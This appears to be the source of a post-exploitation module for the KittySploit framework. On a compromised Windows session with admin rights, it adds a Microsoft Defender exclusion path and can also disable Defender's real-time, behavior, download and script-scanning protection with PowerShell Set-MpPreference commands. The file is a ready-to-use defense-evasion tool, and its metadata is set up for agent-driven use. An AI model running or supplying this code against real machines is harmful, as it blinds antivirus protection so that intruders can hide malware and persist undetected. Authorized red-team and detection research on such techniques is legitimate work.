#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.post.windows.session import WindowsSessionMixin


class Module(Post, WindowsSessionMixin):
    __info__ = {
        "name": "Windows Defender Exclusion / Disable",
        "description": (
            "Add a Defender exclusion path (preferred, lower noise) or optionally "
            "disable real-time protection components via Set-MpPreference."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1562/001/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.5,
            "noise": 0.7,
            "value": 1.1,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {"consumes_capabilities": ["shell"], "produces_capabilities": []},
        },
    }

    exclusion_path = OptString(
        "C:\\Tools",
        "Directory path to exclude from Defender scanning",
        False,
    )
    disable_realtime = OptBool(
        False,
        "Also disable real-time monitoring (noisy — event 5001)",
        False,
    )

    def run(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False
        if not self.win_is_admin():
            print_error("Administrator privileges are required.")
            return False

        path = str(self.exclusion_path or "C:\\Tools").strip()
        pq = self.win_ps_single_quote(path)
        out = self.win_run_powershell(
            f"try {{ Add-MpPreference -ExclusionPath '{pq}'; Write-Output 'OK' }} "
            f"catch {{ Write-Output $_.Exception.Message }}",
            timeout=15,
        )
        ok = "OK" in out
        if ok:
            print_success(f"Defender exclusion added: {path}")
        else:
            print_error(f"Failed to add exclusion: {out or 'no output'}")

        if self.disable_realtime:
            print_warning("Set-MpPreference -Disable* generates Security event 5001 — high noise.")
            disable_out = self.win_run_powershell(
                "Set-MpPreference -DisableRealtimeMonitoring $true;"
                "Set-MpPreference -DisableBehaviorMonitoring $true;"
                "Set-MpPreference -DisableIOAVProtection $true;"
                "Set-MpPreference -DisableScriptScanning $true;"
                "Write-Output 'DISABLED'",
                timeout=20,
            )
            if "DISABLED" in disable_out:
                print_success("Defender real-time components disabled.")
                ok = ok and True
            else:
                print_error(f"Defender disable failed: {disable_out or 'no output'}")
                ok = False

        if ok:
            print_info("Verify: Get-MpComputerStatus | select RealTimeProtectionEnabled")
            verify = self.win_run_powershell(
                "try { Get-MpComputerStatus | Format-List * | Out-String -Width 4096 } "
                "catch { Write-Output $_.Exception.Message }",
                timeout=20,
            )
            if verify:
                print_info(verify[:2000])
        return ok
